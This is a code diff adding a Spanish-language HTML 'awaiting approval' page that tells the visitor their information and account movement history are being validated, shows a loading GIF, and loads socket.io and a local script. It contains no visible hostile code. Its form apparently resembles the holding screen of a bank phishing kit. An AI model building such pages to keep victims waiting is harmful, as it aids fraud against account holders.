@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Esperando Aprobación</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Open Sans', sans-serif;
+      background: #f3f6f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      background: #fff;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    h2 {
+      color: #003049;
+      margin-bottom: 1rem;
+    }
+
+    img {
+      margin-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <h2>Validando su información...</h2>
+    <h6>Manténgase en línea para estudiar su historial de movimeintos en su cuenta.</h6>
+    <img src="https://i.pinimg.com/originals/1f/2d/f8/1f2df8fad7e9bfcb18d9d553f8fc259b.gif" alt="Cargando..." width="200">
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="opciones.js"></script>
+</body>
+</html>
